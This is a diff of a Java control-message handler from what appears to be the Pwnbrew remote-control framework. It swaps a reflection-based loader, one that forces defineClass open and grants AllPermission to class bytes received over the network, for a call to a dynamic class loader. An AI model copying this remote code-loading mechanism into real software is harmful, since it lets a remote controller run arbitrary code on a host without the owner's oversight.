@@ -38,19 +38,8 @@ The copyright on this package is held by Securifera, Inc
 
 package pwnbrew.network.control.messages;
 
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Method;
-import java.net.MalformedURLException;
-import java.net.URL;
-import java.security.AllPermission;
-import java.security.CodeSource;
-import java.security.Permissions;
-import java.security.ProtectionDomain;
-import java.security.cert.Certificate;
 import java.util.Arrays;
-import java.util.logging.Level;
 import pwnbrew.ClientConfig;
-import pwnbrew.log.RemoteLog;
 import pwnbrew.manager.PortManager;
 import pwnbrew.network.ControlOption;
 import pwnbrew.network.PortRouter;
@@ -122,57 +111,17 @@ public final class ClassResponse extends ControlMessage{
     
         int classLength = theClassBytes.length;
         if(classLength > 0 ){
-            
-            //Load the class and resolve it
-            try {
-                Permissions localPermissions = new Permissions();
-                localPermissions.add(new AllPermission());
-                ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), localPermissions);
-                       
-                try {
+            passedManager.getDynamicClassLoader().loadClass(theClassBytes);
+            //Process the original message
+            ControlMessageManager aCMM = ControlMessageManager.getControlMessageManager();
+            if( aCMM != null ){
+                //Get the port
+                ClientConfig aConf = ClientConfig.getConfig();
+                int socketPort = aConf.getSocketPort();
 
-                    //Get the class loader
-                    ClassLoader systemLoader = ClassLoader.getSystemClassLoader();
-                    Class systemClass = ClassLoader.class;
-                    
-                    //Set the params for define class
-                    Class[] classParams = new Class[]{String.class, byte[].class, int.class, int.class, ProtectionDomain.class};
-                    Method systemMethod = systemClass.getDeclaredMethod("defineClass",  classParams);
-                    //Set the method to accessible
-                    systemMethod.setAccessible(true);
-                    //Invoke the method
-                    Object anObj = systemMethod.invoke(systemLoader, new Object[]{ null, theClassBytes, 0, classLength, localProtectionDomain });
-                    if( anObj instanceof Class ){
-                        //Cast to new class
-                        Class aClass = (Class)anObj;
-                        classParams = new Class[]{ Class.class };
-                        systemMethod = systemClass.getDeclaredMethod("resolveClass",  classParams);
-                        
-                        //Set the method to accessible
-                        systemMethod.setAccessible(true);
-                        
-                        //Invoke
-                        systemMethod.invoke(systemLoader, new Object[]{ aClass });
-                        
-                        //Process the original message
-                        ControlMessageManager aCMM = ControlMessageManager.getControlMessageManager();
-                        if( aCMM != null ){
-                            //Get the port
-                            ClientConfig aConf = ClientConfig.getConfig();
-                            int socketPort = aConf.getSocketPort();
-                            
-                            //Get the port router
-                            PortRouter aPR = passedManager.getPortRouter(socketPort);
-                            aCMM.handleMessage( aPR, theMsgBytes );
-                        }
-                    }
-        
-                } catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | NoSuchMethodException | SecurityException ex) {
-                    RemoteLog.log(Level.SEVERE, NAME_Class, "loadJar()", ex.getMessage(), ex );
-                }
-          
-            } catch( MalformedURLException ex){
-                
+                //Get the port router
+                PortRouter aPR = passedManager.getPortRouter(socketPort);
+                aCMM.handleMessage( aPR, theMsgBytes );
             }
         }
             
